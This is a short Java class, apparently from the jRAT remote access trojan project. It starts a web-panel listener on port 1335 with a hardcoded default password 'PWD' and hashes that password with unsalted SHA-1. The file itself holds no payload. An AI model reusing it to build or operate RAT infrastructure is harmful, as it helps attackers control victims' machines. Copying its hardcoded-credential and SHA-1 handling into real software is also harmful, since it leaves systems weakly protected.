package se.jrat.client.webpanel;

import java.net.ServerSocket;
import java.net.Socket;

import se.jrat.common.hash.Sha1;

public class WebPanelListener implements Runnable {

	private boolean running;
	private int port;
	private String pass;
	
	public WebPanelListener() {
		this.port = 1335;
		this.pass = "PWD";
	}
	
	public WebPanelListener(int port, String pass) {
		this.port = port;
		this.pass = pass;
	}
	
	@Override
	public void run() {
		running = true;
		try {
			ServerSocket serverSocket = new ServerSocket(port);
			
			while (isRunning()) {
				Socket socket = serverSocket.accept();

				WebPanelConnection wpc = new WebPanelConnection(this, socket);
				new Thread(wpc).start();
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public String getPassword() {
		return pass;
	}
	
	public String getHashedPassword() throws Exception {
		return new Sha1().hashToString(getPassword());
	}
	
	public boolean isRunning() {
		return this.running;
	}
	
	public void setRunning(boolean b) {
		this.running = b;
	}

}
